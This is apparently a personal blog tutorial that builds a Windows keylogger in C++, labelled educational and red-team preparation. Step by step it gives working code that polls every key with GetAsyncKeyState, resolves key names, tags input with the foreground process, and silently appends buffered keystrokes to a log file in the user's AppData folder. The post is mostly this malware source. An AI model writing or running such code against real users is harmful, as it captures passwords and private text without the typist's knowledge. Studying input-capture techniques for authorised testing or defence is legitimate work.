---
layout: post
title: Building a Keylogger for Windows in C++
description: This project is for educational purposes only. I built it to better understand how low-level keyboard input works in Windows and to prepare for writing offensive tooling in red team engagements.
date: 2025-12-7 9:07:00 -0700
categories:
  - hacking
  - malware-development
  - coding
  - c++
tags:
  - cpp
  - hacking
image: /assets/images/keylogger.jepg
image_alt: Building a Keylogger for Windows in C++
author: Drew Alleman
last_modified_at: 2025-12-7 9:07:00 -0700
---
# Introduction
This is for education purposes only! I built this to prepare for building offensive tools in red teaming assignments. 
# Goals
This project is for educational purposes only. I built it to better understand how low-level keyboard input works in Windows and to prepare for writing offensive tooling in red team engagements.
# Quicklinks
- [[#Capturing Keyboard Input with GetAsyncKeyState]]
- [[#Mapping Keycodes to Real Characters]]
- [[#Fetching the Current Process Name]]
- [[#Building our Keylogger Function]]
- [[#Writing our Keypresses to a File]]
- [[#Our Final Keylogger Function]]
# Capturing Keyboard Input with GetAsyncKeyState

There’s no single Windows API that says “give me every key the user presses.” Instead, we can poll the state of each virtual key using [GetAsyncKeyState](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getasynckeystate) to detect when a key has just been pressed.

```c++
SHORT GetAsyncKeyState(
  [in] int vKey
);
```

We can loop through all the possible [VirtualKeys](https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes) with a for loop ranging from 5 to 256 (we exclude the first 4 because they are mouse inputs).

```c++
    while (true) {
        for (int keyCode = 5; keyCode < 256; ++keyCode) {
		    // 0x01 bit is set if the key was pressed since the last call
            if (GetAsyncKeyState(keyCode) & 0x01) {
	            std::cout << keyCode << std::endl;
            }
        }
        Sleep(65); // avoid destroying the CPU
    }
```

# Mapping Keycodes to Real Characters
Printing out the raw virtual-key code doesn’t do a whole lot for us, so let’s map it to something human-readable. We can use  [MapVirtualKeyA](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-mapvirtualkeya) to translate a virtual-key code (VK) into a hardware scan code, and then `GetKeyNameTextA` to turn that scan code into a key name like `"A"`, `"Enter"`, or `"Left"`.

```c++
UINT MapVirtualKeyA(
  [in] UINT uCode,
  [in] UINT uMapType
);
```

For `uMapType` we’ll use `MAPVK_VK_TO_VSC`, which converts a virtual-key code into a scan code:

```c++
std::string getKeyNameFromVk(int vkCode) {
    // Ignore nonsense / reserved vk
    if (vkCode <= 0 || vkCode == 255) {
        return "UNKNOWN";
    }
    UINT scanCode = MapVirtualKeyA(vkCode, MAPVK_VK_TO_VSC);
    if (scanCode == 0) {
	    return "UNKNOWN";
    }
}
```

We then have to perform a shift of 16 on the return value from `MapVirtualKeyA` in-order to pass it to [GetKeyNameTextA](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeynametexta).  `GetKeyNameTextA` will map the key to an actual char.

```c++
int GetKeyNameTextA(
  [in]  LONG  lParam,
  [out] LPSTR lpString,
  [in]  int   cchSize
);
```

```c++
std::string getKeyNameFromVk(int vkCode) {
    // Ignore nonsense / reserved vk
    if (vkCode <= 0 || vkCode == 255) {
        return "UNKNOWN";
    }

    UINT scanCode = MapVirtualKeyA(vkCode, MAPVK_VK_TO_VSC);
    // If we can translate the key.
    if (scanCode != 0) {
	    // GetKeyNameTextA expects the scan code to live in bits 16–23 of lParam,
	    // using the same layout as a WM_KEYDOWN lParam. So we shift it left by 16.
        LONG lParam = static_cast<LONG>(scanCode) << 16;

        char name[64] = { 0 };
        int len = GetKeyNameTextA(lParam, name, sizeof(name));
	    if (len > 0) {
	        return std::string(name, len);  // e.g. "A", "Enter", "Left"
	    }
    }
    // Fallback: just return the raw VK code if we can't resolve a name.
    return "VK_" + std::to_string(vkCode);
```

# Fetching the Current Process Name
Windows makes it easy to identify which process owns the currently active window through the [GetForegroundWindow](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getforegroundwindow)  API:

```c++
HWND hWnd = GetForegroundWindow();
```

To get the process name from the `HWND` (e.g. `firefox.exe`), we need to:
1. Extract the **process ID (PID)** associated with the window  
    using [GetWindowThreadProcessId](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getwindowthreadprocessid)
2. Use the PID to open a real process handle via [OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)
3. Pass that process handle to [GetModuleBaseNameA](https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-getmodulebasenamea) to retrieve the executable name

```c++
std::string getCurrentProcessName() {
	// Get the window handle that belongs to the USER32 subsystem.
    HWND hWnd = GetForegroundWindow();

    if (!hWnd) {
        return "<no foreground window>";
    }
	
	// Fetch the PID associated to the process
    DWORD pid = 0;
    GetWindowThreadProcessId(hWnd, &pid);

    if (pid == 0)
        return "<unknown>";
	
	// Open the process and return a process handle
    HANDLE hProcess = OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
        FALSE,
        pid
    );

    if (!hProcess)
        return "<access denied>";
	// Map the name of the process to `name` using GetModuleBaseNameA
    char name[MAX_PATH] = { 0 };
    if (GetModuleBaseNameA(hProcess, NULL, name, MAX_PATH) == 0) {
        CloseHandle(hProcess);
        return "<unknown>";
    }

    CloseHandle(hProcess);
    // Cast it to a string
    return std::string(name);
}
```

# Building our Keylogger Function
Now that we have most of the keylogger built let's start to put it all together. 
```c++
void Keylogger() {
    while (true) {
        for (int keyCode = 5; keyCode < 256; ++keyCode) {
            if (GetAsyncKeyState(keyCode) & 0x01) {
                std::string currentProcess = getCurrentProcessName();
                std::string keyChar = getKeyNameFromVk(keyCode);
                std::cout << "Typed " << keyChar << " in process " << currentProcess;
            }
        }
        Sleep(65);
    }

}
```

# Writing our Keypresses to a File
Let’s finish the project by implementing the logic to log our keystrokes to a file. Writing to disk on every loop iteration would be wasteful and unnecessary, so we’ll instead buffer the keystrokes and write them only when the user switches to a different active window.

Before doing that, we need a function that handles writing to the log file. I also added a `replacements` map that translates special keys into their intended characters—for example, mapping `"Tab"` to an actual tab indentation rather than literally logging the word `"Tab"`.

```c++
const char* LOG_FILE = "C:\\Users\\DrewQ\\AppData\\Local\\keypresses.txt";

static const std::unordered_map<std::string, std::string> replacements{
    {"Tab", "   "},
    {"Enter", "\n"},
    {"Space", " "},
    {"Shift", " [SHIFT] "},
    {"Ctrl", " [CTRL] " },
    { "Alt", " [ALT] " },
    {"Caps Lock", " [Caps Lock] "},
    {"Backspace", " [Backspace] "}
};

void writeKeysToLogfile(std::vector<std::string> keys, std::string processName) {
    if (keys.empty()) {
        return;
    }
    std::ofstream file(LOG_FILE, std::ios::app);

    if (!file.is_open()) {
        return;
    }
    file << "\n--------------------------------------------------" << std::endl;
    file << "Keys from Process: " << processName << std::endl;

    for (const std::string& key : keys) {
        auto it = replacements.find(key);
        if (it != replacements.end()) {
            file << it->second;
        }
        else {
            file << key;
        }
    }
    file << "\n--------------------------------------------------" << std::endl;
}
```

# Our Final Keylogger Function
We can store the captured keystrokes in a vector and write them to the log whenever the user switches to a new active window. After writing the data, we simply clear the vector to prepare for recording the next set of input.
```c++
void Keylogger() {
    std::string lastWindow = getCurrentProcessName();
    std::string newWindow;
    std::vector<std::string> keys{};
    while (true) {
        for (int keyCode = 5; keyCode < 256; ++keyCode) {
            if (GetAsyncKeyState(keyCode) & 0x01) {
                newWindow = getCurrentProcessName();
                if (lastWindow != newWindow) {
                    writeKeysToLogfile(keys, lastWindow);
                    lastWindow = newWindow;
                    keys.clear();
                }
                std::string keyChar = getKeyNameFromVk(keyCode);
                keys.push_back(keyChar);
            }
        }
        Sleep(65);
    }

}

```
